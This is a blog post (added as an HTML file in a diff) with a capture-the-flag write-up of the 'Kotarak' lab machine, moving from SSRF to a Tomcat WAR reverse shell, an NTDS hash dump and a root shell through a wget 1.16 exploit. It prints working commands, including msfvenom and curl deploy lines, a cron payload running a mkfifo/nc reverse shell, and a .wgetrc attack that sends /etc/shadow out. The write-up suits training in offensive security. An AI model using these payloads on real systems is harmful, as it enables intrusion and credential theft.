@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Linux - Hard] - Kotarak | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Linux - Hard] - Kotarak" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/08/26/Kotarak.html" />
+<meta property="og:url" content="http://localhost:4000/2022/08/26/Kotarak.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-26T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Linux - Hard] - Kotarak" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-26T00:00:00+02:00","datePublished":"2022-08-26T00:00:00+02:00","headline":"HTB Writeup [Linux - Hard] - Kotarak","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/08/26/Kotarak.html"},"url":"http://localhost:4000/2022/08/26/Kotarak.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Linux - Hard] - Kotarak</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-08-26T00:00:00+02:00" itemprop="datePublished">Aug 26, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Kotarak/Kotarak.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Kotarak</strong> is a really fun box. it had <strong>SSH</strong>, an <strong>Apache web server</strong> and <strong>Tomcat</strong> listening on the outside.</li>
+  <li><em>Even though the Tomcat was vulnerable to</em> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938">Ghostcat</a>, that path didn’t take us anywhere.</li>
+  <li><em>Instead,</em> the <strong>web page</strong> on the <strong>Apache</strong> had a <strong>Server-Side Request Forgery</strong> which we could exploit to get further.</li>
+  <li>We used the <strong>SSRF</strong> and <code class="language-plaintext highlighter-rouge">wfuzz</code> to <strong>enumerate the open internal ports</strong> and found a <strong>web page which had a backup</strong> of the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file.</li>
+  <li>That file <strong>contained credentials</strong> that we used to <strong>upload a WAR reverse shell</strong> and get on the box.</li>
+  <li><em>On the file system,</em> we found an <strong>Active Directory</strong> <code class="language-plaintext highlighter-rouge">ntds.dit</code> <strong>dump</strong> which was apparently a remnant of a pentest.</li>
+  <li>We <strong>extracted all the domain hashes</strong> from that and cracked one of them for a password which belonged to the <code class="language-plaintext highlighter-rouge">atanas</code> local user.</li>
+  <li><em>As</em> <code class="language-plaintext highlighter-rouge">atanas</code>, we came to <strong>find a file owned by us</strong> called <code class="language-plaintext highlighter-rouge">app.log</code> <strong><em>within the root folder.</em></strong></li>
+  <li>It contained past events of <strong>another host using a vulnerable version</strong> of <code class="language-plaintext highlighter-rouge">wget</code> to fetch data from ours.</li>
+  <li><em>After finding a tool called</em> <code class="language-plaintext highlighter-rouge">authbind</code> <em>installed on the system</em> (<em>it lets you use low ports without being root</em>) we use it to <strong>deploy a python web server</strong> and verify that <strong><em>there were indeed requests still being made to our machine.</em></strong></li>
+  <li>We set up <strong>an elaborate exploit</strong> to target the client’s <code class="language-plaintext highlighter-rouge">wget</code> enabling us to <strong>plant a cron job</strong> to <strong>run as root</strong> and <strong>give us a shell on his box.</strong></li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
+|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
+|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
+8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
+|   Potentially risky methods: PUT DELETE
+|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
+8080/tcp  open  http    Apache Tomcat 8.5.5
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Apache Tomcat/8.5.5 - Error report
+60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title:         Kotarak Web Hosting        
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>The <strong>full range port scan</strong> gets us that <strong>Apache on port 60000</strong> as well as the <strong>two Tomcat ports</strong> 8009 and 8080 plus <strong>SSH</strong>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">http-title</code> nmap script gives us a hint that there’s <strong>custom content</strong> there (<strong>Kotarak Web Hosting</strong>)</p>
+
+<h2 id="quickly-testing-tomcat">Quickly Testing Tomcat</h2>
+<p>We will go over some <strong>fast checks</strong> here first looking for <strong>easy wins</strong>.</p>
+
+<p><em>when visiting port 8080,</em> we found <strong>an error message</strong> there <strong>instead of the standard home page.</strong></p>
+
+<p><img src="/assets/Kotarak/tomcat-home-page-error.jpg" alt="" /></p>
+
+<p>We first want to <strong>test for default credentials</strong> in the <strong>Tomcat manager interface</strong>. So we check for it in <strong>the standard location</strong> at <code class="language-plaintext highlighter-rouge">/manager/html</code></p>
+
+<p><img src="/assets/Kotarak/tomcat-manager-login.jpg" alt="" /></p>
+
+<p>It’s there. that <strong>pop-up</strong> indicates <strong>HTTP basic authentication</strong>. we can use <code class="language-plaintext highlighter-rouge">hydra</code> to brute-force that.</p>
+
+<p>we’re going to use <strong>Metasploit’s default user/password list:</strong></p>
+
+<p><img src="/assets/Kotarak/getting-the-msf-list.jpg" alt="" /></p>
+
+<p>but we need to <strong>change up the list</strong> to match the format that <code class="language-plaintext highlighter-rouge">hydra</code>’s <code class="language-plaintext highlighter-rouge">-C</code> flag will accept: <code class="language-plaintext highlighter-rouge">login:pass</code></p>
+
+<p><img src="/assets/Kotarak/the-list-and-hydra-usage.jpg" alt="" /></p>
+
+<p>a quick <code class="language-plaintext highlighter-rouge">sed</code> <strong>replacing all spaces with colons</strong> (<code class="language-plaintext highlighter-rouge">:</code>) takes care of that and we <strong>save the list to a file</strong> before launcing the attack</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-C</span> tomcat_user_pass_list.txt <span class="nt">-s</span> 8080 <span class="nt">-f</span> kotarak http-get /manager/html <span class="nt">-vV</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Kotarak/hydra-attack.jpg" alt="" /></p>
+
+<p>no luck though :/</p>
+
+<p><em>Next,</em> we <strong>check for exploits</strong> using <code class="language-plaintext highlighter-rouge">searchsploit</code> (our version is 8.5.5)</p>
+
+<p><img src="/assets/Kotarak/searchsploit-tomcat-8.jpg" alt="" /></p>
+
+<p>The only match was “Apache Tomcat 6/7/8/9 Information Disclosure” <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-6816">CVE-2016-6816</a>. but it didn’t seem of good use to us.</p>
+
+<p><em>however,</em> we ought to check if the famous <strong>Ghostcat vulnerability</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1938">CVE-2020-1938</a> was there.</p>
+
+<p><img src="/assets/Kotarak/ghostcat-nvd.jpg" alt="" /></p>
+
+<p><strong>our version should be vulnerable.</strong> Let’s use this <a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">Github exploit</a> for testing:</p>
+
+<p><img src="/assets/Kotarak/ajpshooter-usage.jpg" alt="" /></p>
+
+<p>the usage seems pretty straighforward.</p>
+
+<p><em>from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output,</em> the <code class="language-plaintext highlighter-rouge">ajp_port</code> port is <code class="language-plaintext highlighter-rouge">8009</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ajpShooter.py http://kotarak:8080 8009 /WEB-INF/web.xml <span class="nb">read</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Kotarak/ajpshooter-works.jpg" alt="" /></p>
+
+<p>We were <strong>able to read</strong> the <code class="language-plaintext highlighter-rouge">/WEB-INF/web.xml</code> file but <strong>there wasn’t anything useful in it</strong>. So we move on..</p>
+
+<h2 id="the-apache-high-port">The Apache High Port</h2>
+<p><em>On port 60000,</em> we find this page:</p>
+
+<p><img src="/assets/Kotarak/port-60k.jpg" alt="" /></p>
+
+<p>none of the links on the left side work. But our senses are telling us that we <strong>should check for SSRF here.</strong></p>
+
+<p>That’s because the page talks <strong>about browsing</strong>. <em>And, in the source code,</em> the form’s <strong>action for submission</strong> is the <code class="language-plaintext highlighter-rouge">url.php</code> file.</p>
+
+<p>we have to <strong>test a URL here as input.</strong></p>
+
+<p><img src="/assets/Kotarak/possible-ssrf-detection.jpg" alt="" /></p>
+
+<p>we’ll first test if it can connect back to us.</p>
+
+<p>So we stand up a <strong>quick PHP web server</strong> with <code class="language-plaintext highlighter-rouge">php -S 0.0.0.0:80</code> and supply the URL for our kali:</p>
+
+<p><strong>Note:</strong> a normal python web server or netcat would still be OK. <em>I just felt like using PHP at the time XD</em></p>
+
+<p><img src="/assets/Kotarak/ssrf-confirmed.jpg" alt="" /></p>
+
+<p>we got a request back!</p>
+
+<h2 id="exploiting-ssrf">Exploiting SSRF</h2>
+<p>We’re going to use <code class="language-plaintext highlighter-rouge">wfuzz</code> to see <strong>what’s listening on the box locally.</strong></p>
+
+<p>we first do a <strong>quick fuzz</strong> over ports 8080 to 8090 to <strong>see the reponses for open ports (like 8080) vs. closed ports (8081-8090)</strong> and be able to <strong>tune out the closed ones.</strong></p>
+
+<p><strong><em>a.k.a calibrate our toolz :D</em></strong></p>
+
+<p><img src="/assets/Kotarak/wfuzz-test-run.jpg" alt="" /></p>
+
+<p><em>alright, from the response size,</em> we <strong>detect port 8080</strong> which <strong>we knew was up serving the tomcat</strong></p>
+
+<p>we can deduce that <strong>there’s nothing listening on the other ports</strong> from the small responses (2 characters).</p>
+
+<p>we will use the <code class="language-plaintext highlighter-rouge">--hh</code> flag to <strong>exclude those responses</strong> and <strong>provide the full range of TCP ports</strong> (1-65535) for fuzzing.</p>
+
+<p>Setting the <code class="language-plaintext highlighter-rouge">-t</code> flag to <strong>50 concurrent connections</strong> is good <strong><em>for speed</em></strong> since <strong>we’re going to do 65K+ requests</strong> and <em>we haven’t got all day :D</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-t</span> 50 <span class="nt">--hh</span> 2 <span class="nt">-z</span> range,1-65535 <span class="nt">-c</span> http://kotarak:60000/url.php?path<span class="o">=</span>http://127.0.0.1:FUZZ
+</code></pre></div></div>
+
+<p><img src="/assets/Kotarak/ssrf-portscan-results.jpg" alt="" /></p>
+
+<p>a <strong>lot of ports</strong> come up:</p>
+<ul>
+  <li>22 (SSH)</li>
+  <li>90</li>
+  <li>110</li>
+  <li>200</li>
+  <li>320</li>
+  <li>888</li>
+  <li>3306 (mysql most likely)</li>
+  <li>8080 (tomcat)</li>
+  <li>and 60000 (the browser page)</li>
+</ul>
+
+<p><em>checking the unknown ports…</em></p>
+
+<p><strong>Port 90:</strong> junk</p>
+
+<p><img src="/assets/Kotarak/ssrf-port-90.jpg" alt="" /></p>
+
+<p><strong>Port 110:</strong> junk too</p>
+
+<p><img src="/assets/Kotarak/ssrf-port-110.jpg" alt="" /></p>
+
+<p><strong>Port 200:</strong> third is a charm right? nope. junk also :P</p>
+
+<p><img src="/assets/Kotarak/ssrf-port-200.jpg" alt="" /></p>
+
+<p><strong>Port 320:</strong> a login form! but, the <strong><em>action field within the form is empty.</em></strong> junk for the 4th time :/</p>
+
+<p><img src="/assets/Kotarak/ssrf-port-320.jpg" alt="" /></p>
+
+<p><strong>Port 888:</strong> at last something interesting here xD</p>
+
+<p><img src="/assets/Kotarak/ssrf-port-888.jpg" alt="" /></p>
+
+<p><em>to get the file,</em> we add <code class="language-plaintext highlighter-rouge">?doc=backup</code> to the base url and use <code class="language-plaintext highlighter-rouge">curl</code> <em>instead of clicking the link.</em></p>
+
+<p><img src="/assets/Kotarak/cred-found-on-888.jpg" alt="" /></p>
+
+<p>it turns out to be the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file. <strong>we got creds!</strong></p>
+
+<h2 id="war-shell-upload">WAR Shell Upload</h2>
+<p><em>Before getting too excited,</em> we first <strong>verify the logins</strong> with <code class="language-plaintext highlighter-rouge">hydra</code></p>
+
+<p><img src="/assets/Kotarak/hydra-verify-tomcat.jpg" alt="" /></p>
+
+<p>Green! we’re good to go</p>
+
+<p><strong><em>To get remote code exectuion,</em></strong> we will need to <strong>generate a WAR reverse shell</strong> with <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.5 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> letmein.war
+</code></pre></div></div>
+
+<p>and <strong>upload the it</strong> with <code class="language-plaintext highlighter-rouge">curl</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> admin:<span class="s1">'3@g01PdhB!'</span> <span class="nt">--upload-file</span> letmein.war <span class="s2">"http://kotarak:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
+</code></pre></div></div>
+
+<p>then do another <code class="language-plaintext highlighter-rouge">curl</code> to <strong>hit the endpoint</strong> and <strong>trigger our shell</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://kotarak:8080/shell
+</code></pre></div></div>
+
+<p>It should look like this:</p>
+
+<p><img src="/assets/Kotarak/shell-as-tomcat.jpg" alt="" /></p>
+
+<p><strong>We’re in. Sweet :]</strong></p>
+
+<h2 id="lateral-movement">Lateral Movement</h2>
+<p><em>after getting our reverse shell,</em> we <strong>improve it</strong> like the usual:</p>
+
+<p><img src="/assets/Kotarak/shell-improvement.jpg" alt="" /></p>
+
+<p>and we <code class="language-plaintext highlighter-rouge">source</code> the <code class="language-plaintext highlighter-rouge">.bashrc</code> file from the <code class="language-plaintext highlighter-rouge">atanas</code> user for a colored output.</p>
+
+<p><img src="/assets/Kotarak/getting-colors-in-our-session.jpg" alt="" /></p>
+
+<p><em>when going through the file system,</em> we find <strong>something very interesting:</strong></p>
+
+<p><img src="/assets/Kotarak/finding-ntds-dump.jpg" alt="" /></p>
+
+<p>the <strong>keywords</strong> here are:</p>
+<ul>
+  <li>the <strong>1st file’s name:</strong> <strong>NTDS</strong> (this is the name of the <strong>Active Directory database file</strong> <code class="language-plaintext highlighter-rouge">ntds.dit</code>)</li>
+  <li>the <strong>2nd file’s type:</strong> <strong>MS Windows Registry</strong> file (<em>probably the</em> <strong><em>system hive</em></strong> <em>containing the</em> <strong><em>boot key</em></strong> <em>needed to</em> <strong><em>extract hashes</em></strong>)</li>
+</ul>
+
+<p><strong>these two components are enough for us to get all the domain hashes within.</strong></p>
+
+<p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> script can easily take care of this.</p>
+
+<p>we’re first going to <strong>transfer those files over</strong> to kali to <strong>dump those hashes and try to crack them</strong></p>
+
+<p><img src="/assets/Kotarak/transfer-ad-dump.jpg" alt="" /></p>
+
+<p><em>after renaming the .dit file to</em> <code class="language-plaintext highlighter-rouge">ntds.dit</code> <em>and the .bin file to</em> <code class="language-plaintext highlighter-rouge">system</code>, we run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-just-dc-ntlm</span> <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system <span class="nb">local</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Kotarak/secrets-dump.jpg" alt="" /></p>
+
+<p>We then pass those to <code class="language-plaintext highlighter-rouge">hashcat</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p><img src="/assets/Kotarak/hashcat-cracking.jpg" alt="" /></p>
+
+<p>the hash that cracked belonged to the <code class="language-plaintext highlighter-rouge">administrator</code> user.</p>
+
+<p><img src="/assets/Kotarak/knowing-which-hash-was-cracked.jpg" alt="" /></p>
+
+<p><em>However, just to be sure,</em> we’re going to try it with both <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">atanas</code>. since we didn’t find other users locally with a proper shell.</p>
+
+<p><img src="/assets/Kotarak/finding-local-linux-users.jpg" alt="" /></p>
+
+<p>it failed with <code class="language-plaintext highlighter-rouge">root</code> but worked with <code class="language-plaintext highlighter-rouge">atanas</code></p>
+
+<p><img src="/assets/Kotarak/shell-as-atanas.jpg" alt="" /></p>
+
+<h2 id="unusual-activity">Unusual Activity</h2>
+<p><em>Starting on privesc,</em> we ran <a href="https://github.com/carlospolop/PEASS-ng">LinPEAS</a> and <strong>saw something very strange:</strong></p>
+
+<p><img src="/assets/Kotarak/root-files.jpg" alt="" /></p>
+
+<p>we own files in <code class="language-plaintext highlighter-rouge">/root</code>?</p>
+
+<p><em>to confirm,</em> we run a <code class="language-plaintext highlighter-rouge">find</code> command and checked the files owned by us:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">flag.txt</code></li>
+  <li><code class="language-plaintext highlighter-rouge">app.log</code></li>
+</ul>
+
+<p><img src="/assets/Kotarak/activity-detected.jpg" alt="" /></p>
+
+<p><em>Looking above,</em> you can see a few things in the <code class="language-plaintext highlighter-rouge">app.log</code> file:</p>
+<ol>
+  <li>there’s <strong>another machine’s IP:</strong> 10.0.3.133</li>
+  <li><em>looking at the dates, back in 2017 (when the box first came out),</em> it executed <code class="language-plaintext highlighter-rouge">wget</code> 3 times <em>-each 2 minutes apart-</em> to <strong>get a file</strong> called <code class="language-plaintext highlighter-rouge">archive.tar.gz</code> which it couldn’t get (it got a 404 not found)</li>
+  <li>it was <strong>using an older version</strong> of <code class="language-plaintext highlighter-rouge">wget</code> (1.16)</li>
+</ol>
+
+<p>we make <strong>a couple of checks</strong> to see what’s going on:</p>
+<ul>
+  <li><strong>searching the file system</strong> for that <code class="language-plaintext highlighter-rouge">archive.tar.gz</code> and check if we can see its contents.</li>
+  <li><strong>pinging 10.0.3.133</strong> to see if it’s there.</li>
+</ul>
+
+<p><img src="/assets/Kotarak/understanding-app-log.jpg" alt="" /></p>
+
+<p>we couldn’t find <code class="language-plaintext highlighter-rouge">archive.tar.gz</code>. But, <strong>the host 10.0.3.133 was there and responding to our pings!</strong></p>
+
+<p>we look up <strong>exploit-db</strong> for that version of <code class="language-plaintext highlighter-rouge">wget</code> before moving on</p>
+
+<p><img src="/assets/Kotarak/wget-searchsploit.jpg" alt="" /></p>
+
+<p>there was actually an exploit for <code class="language-plaintext highlighter-rouge">wget</code>!</p>
+
+<h2 id="elaborate-client-exploitation-and-privilege-escalation">Elaborate Client Exploitation and Privilege Escalation</h2>
+<p><strong>Client-Side attacks</strong> aren’t new. <em>But for some odd reason,</em> <strong>exploiting a command-line tool</strong> felt weird :D</p>
+
+<p><em>Anyway,</em> we <strong>check out exploit’s details</strong> on <a href="https://www.exploit-db.com/exploits/40064">Exploit-db</a></p>
+
+<p>It was a very interesting read. <em>To sum it up,</em> the scenario is:</p>
+<ul>
+  <li>if a victim is using <code class="language-plaintext highlighter-rouge">wget</code> 1.16 to download a file <strong>from a server that we control.</strong></li>
+  <li><em>and</em> <code class="language-plaintext highlighter-rouge">wget</code> <em>was used</em> <strong><em>without an output being specified</em></strong> <em>(using the</em> <code class="language-plaintext highlighter-rouge">-O</code> <em>flag)</em>, it would <strong>save in the current working directory</strong>. which could potentially be <strong><em>the user’s home folder.</em></strong></li>
+  <li><em>to exploit a situation like that,</em> we have to <strong>set up a web server</strong> that <strong>will respond with a redirect to an FTP server serving a malicious</strong> <code class="language-plaintext highlighter-rouge">.wgetrc</code> file.</li>
+  <li>that file would then be <strong>saved to the victim’s home folder</strong> becoming <code class="language-plaintext highlighter-rouge">wget</code>’s main configuration. since it would search for it there first.</li>
+  <li>It would <strong>specify that upcoming downloads</strong> should have <code class="language-plaintext highlighter-rouge">/etc/cron.d/wget-root-shell</code> as their output location.</li>
+  <li>that configuration would also have the client issue <strong>POST</strong> requests containing his <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
+  <li><em>If everything works, on the second request to our server,</em> the victim’s <code class="language-plaintext highlighter-rouge">/etc/shadow</code> would be there in the request body.</li>
+  <li>And it would <strong>save our then-hosted reverse shell as a cron job</strong> called <code class="language-plaintext highlighter-rouge">wget-root-shell</code> in their <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> folder.</li>
+  <li><em>Having registered a</em> <code class="language-plaintext highlighter-rouge">cron</code> <em>job for that user,</em> we would <strong>get a reverse shell</strong> in the upcoming minute.</li>
+</ul>
+
+<p><strong>hopefully this would make more sense in demonstration below :D</strong></p>
+
+<p><em>Alright, to perform this exploit,</em> we need to be able to <strong>serve a website on the machine on port 80</strong> and <strong>verify we’re still getting requests</strong> from a <strong>vulnerable</strong> <code class="language-plaintext highlighter-rouge">wget</code> <strong>web client.</strong></p>
+
+<p><em>But,</em> access to ports below 1000 is only available for <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>the only way around this is installing a tool called <code class="language-plaintext highlighter-rouge">authbind</code> (<em>which also requires</em> <code class="language-plaintext highlighter-rouge">root</code> <em>permission</em>).</p>
+
+<p>let’s first check to see that tool was there or not.</p>
+
+<p><img src="/assets/Kotarak/authbind-installed.jpg" alt="" /></p>
+
+<p>it’s there! we’re now <strong>more confident</strong> of <strong>being on the right track</strong></p>
+
+<p><em>with it,</em> we set up a <code class="language-plaintext highlighter-rouge">python</code> web server on port 80 and <strong>wait to detect any incoming web requests.</strong></p>
+
+<p><img src="/assets/Kotarak/getting-an-http-request.jpg" alt="" /></p>
+
+<p>We also check the python <code class="language-plaintext highlighter-rouge">pyftpdlib</code> module <strong>which we will need as our FTP server.</strong></p>
+
+<p><em>And, if that wasn’t there,</em> we should be able to set it up on our kali and still be good.</p>
+
+<p><img src="/assets/Kotarak/python-ftp-is-there.jpg" alt="" /></p>
+
+<p>Great. let’s go!</p>
+
+<h3 id="step-1-creating-the-evil-wgetrc-file">Step #1: Creating the evil .wgetrc file</h3>
+
+<p>we set this up following the instructions on Exploit-DB</p>
+
+<p><img src="/assets/Kotarak/exploit-db-wget-instructions.jpg" alt="" /></p>
+
+<p><img src="/assets/Kotarak/wgetrc-created.jpg" alt="" /></p>
+
+<p><em>Starting next step, since we’re going to do many things at the same time,</em> we will use <code class="language-plaintext highlighter-rouge">tmux</code> to <strong>split up our terminal.</strong></p>
+
+<p><em>However, since we already use</em> <code class="language-plaintext highlighter-rouge">tmux</code> <em>on our kali,</em> we’re going <strong>to change the bind key</strong> to <strong>be able to interact with both</strong> <code class="language-plaintext highlighter-rouge">tmux</code> <strong>instances.</strong></p>
+
+<p>here’s what the <code class="language-plaintext highlighter-rouge">~/.tmux.conf</code> file should look like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set-option -g prefix C-a
+set -g default-terminal "xterm-256color"
+</code></pre></div></div>
+
+<p>the second line is <strong>for preserving colors</strong> within <code class="language-plaintext highlighter-rouge">tmux</code> sessions. <em>Quality of life stuff xD</em></p>
+
+<h3 id="step-2-getting-the-python-exploit-and-modifying-it">Step #2: Getting the python exploit and modifying it</h3>
+
+<p><em>After fetching the exploit,</em> we have to <strong>modify a few lines</strong> to suit our needs.</p>
+
+<p>Below is the <strong>default exploit code:</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s">'192.168.57.1'</span>
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s">'192.168.57.1'</span>
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s">"* * * * * root /usr/bin/id &gt; /root/hacked-via-wget </span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>We’re going to <strong>listen on all interfaces with the web server</strong>. so we should set the <code class="language-plaintext highlighter-rouge">HTTP_LISTEN_IP</code> variable to <code class="language-plaintext highlighter-rouge">0.0.0.0</code>.</li>
+  <li>The same <strong>wouldn’t work for the FTP server</strong>. because the victim <strong>must have our machine’s IP in the redirection</strong> to reach it.</li>
+  <li><em>Finally,</em> we need to switch up the <code class="language-plaintext highlighter-rouge">/usr/bin/id &gt; /root/hacked-via-wget</code> cron job command to something more serious <strong><em>a.k.a. a reverse shell :D</em></strong></li>
+</ul>
+
+<p><em>After modificatiom,</em> it should look like this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s">'0.0.0.0'</span>
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s">'10.10.10.55'</span>
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s">"* * * * * root rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i &lt; /tmp/pipe 2&gt;&amp;1 | nc 10.10.10.55 9000 &gt; /tmp/pipe; rm /tmp/pipe </span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<p>we use the <code class="language-plaintext highlighter-rouge">mkfifo</code> reverse shell because <strong>it works across many linux distros</strong> and <strong>has just been reliable :]</strong></p>
+
+<p>and <strong>we’re making the 10.10.10.55 machine catch the shell</strong> because <strong>we’re not yet sure about our kali being reachable from 10.0.3.133.</strong></p>
+
+<h3 id="step-3-receiving-the-first-wget">Step #3: Receiving the first wget</h3>
+
+<p><em>A few moments after starting the FTP server and the</em> <code class="language-plaintext highlighter-rouge">python</code> <em>exploit,</em> we caught something.</p>
+
+<p><img src="/assets/Kotarak/wget-exploit-and-ftp-together.jpg" alt="" /></p>
+
+<p><em>if you look closely,</em> you would see <strong>the incoming request</strong> for <code class="language-plaintext highlighter-rouge">/archive.tar.gz</code> and <strong>the redirect being sent to FTP</strong> for the <code class="language-plaintext highlighter-rouge">.wgetrc</code> file.</p>
+
+<h3 id="step-4-getting-the-shadow-file-and-deploying-the-evil-cron">Step #4: Getting the shadow file and deploying the evil cron</h3>
+
+<p><em>Two more minutes after,</em> we <strong>get the POST request</strong> containing the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</p>
+
+<p>That’s enough proof that our victim is the <code class="language-plaintext highlighter-rouge">root</code> user. <em>or at least one who can read the shadow file</em></p>
+
+<p>The exploit now <strong>served the</strong> <code class="language-plaintext highlighter-rouge">cron</code> <strong>containing our reverse shell</strong> and <strong>it was downloaded by the victim</strong> to their <code class="language-plaintext highlighter-rouge">/etc/cron.d</code></p>
+
+<p><img src="/assets/Kotarak/receiving-the-shadow-file-and-deploying-cron.jpg" alt="" /></p>
+
+<h3 id="step-5-receiving-the-shell">Step #5: Receiving the Shell</h3>
+
+<p><em>One minute after,</em> the <code class="language-plaintext highlighter-rouge">cron</code> job started and <strong>sent us back our root shell :D</strong></p>
+
+<p><img src="/assets/Kotarak/rooted.jpg" alt="" /></p>
+
+<p><strong>Just amazing :D</strong></p>
+
+  </div><a class="u-url" href="/2022/08/26/Kotarak.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
